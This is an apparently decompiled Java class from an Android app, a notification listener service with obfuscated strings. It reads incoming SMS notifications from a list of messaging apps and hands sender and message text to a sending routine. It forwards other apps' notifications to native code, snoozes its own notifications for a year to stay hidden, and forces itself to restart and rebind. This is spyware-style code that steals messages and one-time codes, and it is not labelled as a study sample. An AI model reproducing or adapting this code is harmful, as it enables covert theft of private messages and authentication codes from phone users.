package com.base.template;

import android.app.Notification;
import android.content.ComponentName;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import java.util.Iterator;
import java.util.List;
import java.util.Set;
import kotlin.ExceptionsKt;
import kotlin.collections.CollectionsKt__CollectionsKt;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.StringsKt__StringsJVMKt;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class NotifListener extends NotificationListenerService {
    private static final String TAG = C0000.decode(new byte[]{120, 46}, "6b042ec26eb1d5");
    public static final Companion Companion = new Companion();
    private static final Set<String> SMS_APP_PACKAGES = ExceptionsKt.setOf(C0000.decode(new byte[]{86, 12, 88, 74, 22, 87, 8, 71, 16, 89, 81, 77, 84, 13, 83, 68, 90, 10, 81, 74, 8, 83, 22, 71, 4, 80, 95, 13, 82}, "5c5de6e4e76c5c76"), C0000.decode(new byte[]{0, 91, 89, 26, 5, 89, 86, 87, 89, 93, 77, 85, 90, 80, 16, 89, 80, 84, 27, 89, 19, 68, 71, 26, 15, 83, 74, 67, 84, 95, 10, 90, 83}, "c444b69058", false), C0000.decode(new byte[]{82, 95, 85, 76, 88, 86, 0, 16, 12, 10, 2, 76, 95, 95, 16}, "108b98dbccfb22ce", 0.0f), C0000.decode(new byte[]{83, 93, 90, 30, 85, 87, 0, 64, 89, 15, 84, 28, 90, 85, 71, 74, 5, 85, 95, 8, 87}, "027049d26f", 0.0f), C0000.decode(new byte[]{83, 87, 84, 30, 79, 89, 88, 13, 93, 81, 23, 93, 90, 67}, "0890709b", 0.0f), C0000.decode(new byte[]{90, 91, 94, 24, 93, 64, 0, 66, 81, 92, 22, 91, 87, 22, 22, 88, 94, 81}, "943655a545862ee9", 0.0f), C0000.decode(new byte[]{7, 92, 91, 75, 81, 8, 9, 90, 12, 11, 67, 77, 91, 94, 66}, "d36e9aa5bd1c6317", 5), C0000.decode(new byte[]{84, 13, 95, 72, 9, 10, 87, 72, 91, 23, 65, 72, 11, 9, 65}, "7b2ffd28", 0.0f), C0000.decode(new byte[]{91, 12, 90, 30, 11, 22, 67, 95, 25, 8, 85, 16}, "8c70df307e", true), C0000.decode(new byte[]{6, 92, 84, 28, 90, 11, 10, 95, 23, 92, 74, 28, 84, 9, 21}, "e3929df0", 0.0f), C0000.decode(new byte[]{83, 92, 85, 29, 65, 1, 86, 13, 90, 4, 30, 94, 85, 64}, "03833d7a7a", 0.0f), C0000.decode(new byte[]{87, 93, 88, 76, 19, 94, 16, 11, 79, 95, 89, 65}, "425be7fda2", 0.0f), C0000.decode(new byte[]{0, 88, 8, 77, 0, 66, 22, 68, 75, 14, 12, 66}, "c7eca1", 3), C0000.decode(new byte[]{81, 92, 9, 23, 91, 10, 77, 86, 69, 87, 84, 3, 23, 95, 87, 64, 23, 88, 81, 12, 87, 94}, "23d96e99788b92", true), C0000.decode(new byte[]{6, 13, 90, 29, 17, 89, 12, 64, 81, 19, 8, 91, 64, 67, 14, 12, 75, 1, 88, 93, 20, 83, 16, 74, 85, 21, 8, 87, 93, 67}, "eb73b6b94aa830ab", true), "com.transsion.messaging", "com.zte.mms", "com.tcl.mms", "com.lge.app.mms");
    private static final Set<String> IGNORED_PACKAGES = ExceptionsKt.setOf(C0000.decode(new byte[]{86, 91, 83, 65, 93, 90, 83}, "757323", 4), C0000.decode(new byte[]{80, 91, 11, 77, 81, 12, 81, 23, 86, 95, 93, 27, 64, 78, 23, 76, 86, 89, 19, 10}, "34fc0b5e969537d8", 7), C0000.decode(new byte[]{5, 86, 11, 77, 5, 92, 7, 74, 91, 90, 83, 74, 21, 1, 18, 77, 15, 13, 3, 65}, "f9fcd2c8437dfd", 7), C0000.decode(new byte[]{7, 94, 94, 28, 5, 91, 80, 70, 86, 81, 6, 28, 70, 81, 10, 85, 90, 92, 3}, "d132d54498b204", 4), C0000.decode(new byte[]{81, 12, 15, 24, 81, 11, 93, 68, 10, 91, 93, 26, 69, 14, 93, 13, 7}, "2cb60e96e2945f"), C0000.decode(new byte[]{85, 92, 89, 75, 85, 91, 6, 17, 89, 90, 80, 75, 80, 92, 3, 15, 83, 65}, "634e45bc", 0.0f), C0000.decode(new byte[]{80, 88, 85, 76, 84, 12, 5, 22, 87, 81, 80, 77, 90, 94, 80, 86, 84, 14, 64, 11}, "378b5bad884c30", 0.0f), C0000.decode(new byte[]{83, 87, 95, 26, 4, 91, 84, 74, 93, 93, 1, 27, 82, 84, 71, 81, 17, 90, 95, 76, 90}, "0824e5", 2), C0000.decode(new byte[]{0, 92, 88, 30, 83, 95, 7, 65, 90, 89, 86, 31, 19, 65, 90, 70, 91, 85, 6, 65, 70, 30, 86, 94, 20, 93, 89, 95, 83, 85, 16}, "c35021", 5), C0000.decode(new byte[]{83, 12, 88, 75, 85, 15, 86, 20, 9, 81, 5, 28, 82, 14, 83, 22, 88, 0, 90, 21, 65, 19, 15}, "0c5e4a2ff8a26a"), C0000.decode(new byte[]{5, 14, 94, 72, 88, 90, 80, 23, 90, 80, 85, 31, 21, 9, 86, 10, 85}, "fa3f944e5911", 0.0f), C0000.decode(new byte[]{0, 93, 88, 79, 87, 92, 81, 19, 12, 91, 81, 79, 70, 83, 86, 10, 2, 85, 80, 8, 88, 65, 65, 0, 15, 94, 80, 19}, "c25a625a", true), C0000.decode(new byte[]{84, 9, 89, 79, 84, 90, 1, 66, 86, 88, 83, 72, 80, 4, 70, 95, 6, 92, 86, 82, 92}, "7f4a54e091"), C0000.decode(new byte[]{6, 94, 84, 72, 84, 90, 6, 65, 13, 8, 1, 31, 90, 7, 89, 81, 12, 87, 3, 19}, "e19f54b3ba", 0.0f), C0000.decode(new byte[]{91, 13, 12, 72, 7, 11, 92, 16, 14, 15, 2, 75, 91, 3, 13, 5, 19, 9, 89, 22, 14, 20, 84}, "8baffe", 0.0f), "com.android.nfc", "com.android.printspooler", "com.android.server.telecom", "com.android.inputmethod.latin", "com.android.launcher", "com.android.launcher3", "com.google.android.gms", "com.google.android.gsf", "com.google.android.setupwizard", "com.google.android.apps.setupwizard", "com.google.android.packageinstaller", "com.google.android.permissioncontroller", "com.google.android.ext.services", "com.google.android.inputmethod.latin", "com.google.android.tts", "com.google.android.projection.gearhead", "com.google.android.deskclock", "com.google.android.apps.wallpaper", "com.google.android.configupdater", "com.google.android.partnersetup", "com.miui.securitycenter", "com.miui.cleanmaster", "com.miui.powerkeeper", "com.miui.home", "com.huawei.systemmanager", "com.huawei.android.launcher", "com.samsung.android.launcher", "com.samsung.android.incallui", "com.samsung.android.dialer", "com.coloros.safecenter", "com.oppo.launcher", "com.realme.launcher");
    private static final List<String> IGNORED_PREFIXES = CollectionsKt__CollectionsKt.listOf(C0000.decode(new byte[]{2, 87, 9, 79, 83, 90, 81, 74, 11, 90, 5, 22, 20, 19, 93, 66, 92, 92, 1, 65, 18, 22}, "a8da2458d3", 5), C0000.decode(new byte[]{2, 13, 88, 75, 84, 95, 5, 16, 90, 12, 81, 31, 18, 7, 71, 19, 80, 67, 79}, "ab5e51", 0.0f), C0000.decode(new byte[]{6, 94, 90, 22, 4, 92, 87, 22, 87, 94, 85, 79, 12, 95, 67, 93, 23, 92, 82, 8, 22}, "e178e23d871a", 5), C0000.decode(new byte[]{81, 92, 95, 24, 95, 90, 93, 84, 94, 83, 22, 84, 92, 87, 64, 89, 81, 81, 28, 92, 68, 83, 74, 89, 83, 74, 28}, "232685", 3), C0000.decode(new byte[]{0, 13, 15, 23, 83, 88, 91, 86, 91, 1, 77, 3, 12, 93, 70, 88, 93, 85, 25, 11, 13, 7, 22, 80, 89, 82, 93, 95, 94, 16, 10, 3, 14, 80, 78, 82, 70}, "cbb947417d", 0.0f));

    public final class Companion {
    }

    private final void handleSmsNotification(StatusBarNotification statusBarNotification) {
        try {
            Notification notification = statusBarNotification.getNotification();
            String string = null;
            Bundle bundle = notification != null ? notification.extras : null;
            if (bundle == null) {
                return;
            }
            CharSequence charSequence = bundle.getCharSequence(C0000.decode(new byte[]{3, 12, 87, 74, 12, 81, 6, 27, 17, 13, 22, 14, 86}, "bb38c8b5ed"));
            String string2 = charSequence != null ? charSequence.toString() : null;
            if (string2 != null && !StringsKt__StringsJVMKt.isBlank(string2)) {
                CharSequence charSequence2 = bundle.getCharSequence(C0000.decode(new byte[]{89, 90, 93, 70, 90, 80, 7, 75, 7, 80, 95, 96, 92, 76, 65}, "849459cee9", 0.0f));
                String string3 = charSequence2 != null ? charSequence2.toString() : null;
                if (string3 == null) {
                    CharSequence charSequence3 = bundle.getCharSequence(C0000.decode(new byte[]{81, 86, 5, 66, 9, 95, 2, 29, 23, 7, 78, 76}, "08a0f6f3cb681e93", true));
                    if (charSequence3 != null) {
                        string = charSequence3.toString();
                    }
                } else {
                    string = string3;
                }
                if (string != null && !StringsKt__StringsJVMKt.isBlank(string)) {
                    SmsDedup.INSTANCE.sendIfNew(getApplicationContext(), string2, string, 0);
                }
            }
        } catch (Exception e) {
            e.getMessage();
        }
    }

    private final void reviveServiceIfNeeded() {
        try {
            long j = getSharedPreferences(C0000.decode(new byte[]{95, 84, 84, 19, 22, 80, 81, 88, 76}, "715ab2498f00"), 0).getLong(C0000.decode(new byte[]{91, 84, 16, 67, 58, 84, 93, 5, 64, 61, 92, 68}, "75c7e68d4b1727", 7), 0L);
            if (System.currentTimeMillis() - j <= 60000 || j <= 0) {
                return;
            }
            Headers.Companion.safeStartService(getApplicationContext(), C0000.decode(new byte[]{126, 40, 60, 102, 35, 98, 44, 51, 124}, "0dc4f4ee93", true));
        } catch (Exception unused) {
        }
    }

    @Override // android.service.notification.NotificationListenerService
    public void onListenerConnected() {
        super.onListenerConnected();
        reviveServiceIfNeeded();
        try {
            StatusBarNotification[] activeNotifications = getActiveNotifications();
            if (activeNotifications != null) {
                for (StatusBarNotification statusBarNotification : activeNotifications) {
                    if (Intrinsics.areEqual(statusBarNotification.getPackageName(), getApplicationContext().getPackageName())) {
                        snoozeNotification(statusBarNotification.getKey(), 31536000000L);
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    @Override // android.service.notification.NotificationListenerService
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        try {
            NotificationListenerService.requestRebind(new ComponentName(getApplicationContext(), (Class<?>) NotifListener.class));
        } catch (Exception unused) {
        }
    }

    @Override // android.service.notification.NotificationListenerService
    public void onNotificationPosted(StatusBarNotification statusBarNotification) {
        String string;
        String string2;
        reviveServiceIfNeeded();
        try {
            String packageName = statusBarNotification.getPackageName();
            String str = "";
            if (packageName == null) {
                packageName = "";
            }
            if (packageName.equals(getApplicationContext().getPackageName())) {
                return;
            }
            if (SMS_APP_PACKAGES.contains(packageName)) {
                handleSmsNotification(statusBarNotification);
                return;
            }
            if (IGNORED_PACKAGES.contains(packageName)) {
                return;
            }
            List<String> list = IGNORED_PREFIXES;
            if (list == null || !list.isEmpty()) {
                Iterator<T> it = list.iterator();
                while (it.hasNext()) {
                    if (packageName.startsWith((String) it.next())) {
                        return;
                    }
                }
            }
            Notification notification = statusBarNotification.getNotification();
            Bundle bundle = notification != null ? notification.extras : null;
            if (bundle == null) {
                return;
            }
            CharSequence charSequence = bundle.getCharSequence(C0000.decode(new byte[]{0, 88, 84, 75, 14, 10, 92, 79, 76, 92, 66, 92, 85}, "a609ac8a856008"));
            if (charSequence == null || (string = charSequence.toString()) == null) {
                string = "";
            }
            CharSequence charSequence2 = bundle.getCharSequence(C0000.decode(new byte[]{83, 94, 81, 69, 89, 89, 92, 72, 7, 80, 85, 100, 80, 79, 66}, "2057608fe9", 0.0f));
            String string3 = charSequence2 != null ? charSequence2.toString() : null;
            if (string3 == null) {
                CharSequence charSequence3 = bundle.getCharSequence(C0000.decode(new byte[]{7, 8, 81, 67, 9, 88, 2, 72, 65, 84, 30, 69}, "ff51f1", false));
                String string4 = charSequence3 != null ? charSequence3.toString() : null;
                if (string4 != null) {
                    str = string4;
                }
            } else {
                str = string3;
            }
            if (StringsKt__StringsJVMKt.isBlank(str) && StringsKt__StringsJVMKt.isBlank(string)) {
                return;
            }
            try {
                string2 = getPackageManager().getApplicationLabel(getPackageManager().getApplicationInfo(packageName, 0)).toString();
            } catch (Exception unused) {
                string2 = packageName;
            }
            NativeBridge.onNotification(packageName, string, str, string2);
        } catch (Exception e) {
            e.getMessage();
        }
    }
}
